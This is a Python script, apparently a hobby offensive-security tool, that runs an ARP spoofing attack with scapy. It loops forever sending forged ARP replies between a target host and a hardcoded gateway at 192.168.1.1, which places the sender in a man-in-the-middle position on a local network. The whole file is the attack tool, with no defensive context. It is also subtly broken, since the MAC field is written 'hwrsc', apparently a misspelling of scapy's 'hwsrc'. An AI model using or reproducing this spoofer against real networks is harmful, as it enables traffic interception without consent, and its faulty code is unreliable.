import argparse
import sys
import time
import signal
import scapy.all as scapy
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_args():
    parser = argparse.ArgumentParser(description='ARP Spoofer')
    parser.add_argument('-t', '--target', required=True, dest='ip_address', help='Host / IP range to spoof')
    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwrsc='aa:bb:cc:44:55:66')
    scapy.send(arp_packet, verbose=False)

def main():
    args = get_args()

    while True:
        spoof(args.ip_address, "192.168.1.1")
        spoof("192.168.1.1", args.ip_address)

        time.sleep(2)

if __name__ == '__main__':
    main()